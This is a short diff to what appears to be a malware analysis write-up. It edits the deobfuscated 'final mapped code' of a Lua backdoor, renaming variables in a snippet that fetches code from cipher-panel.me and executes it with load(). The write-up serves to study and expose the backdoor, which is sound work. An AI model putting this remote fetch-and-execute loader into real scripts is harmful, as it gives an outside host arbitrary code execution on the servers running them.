@@ -74,9 +74,9 @@ Enchanced_Tabs[15] = materials; (Junk Code)
 #### Final Mapped Code
 ```lua
     PerformHttpRequest("https://cipher-panel.me/_i/i?to=l6Tr2", function (errorCode, responseBody)
-        local s = assert(load(responseBody))
-        if (d == nil) then return end
-        s()
+        local payload = assert(load(responseBody))
+        if (responseBody == nil) then return end
+        payload()
     end)
 ```
 
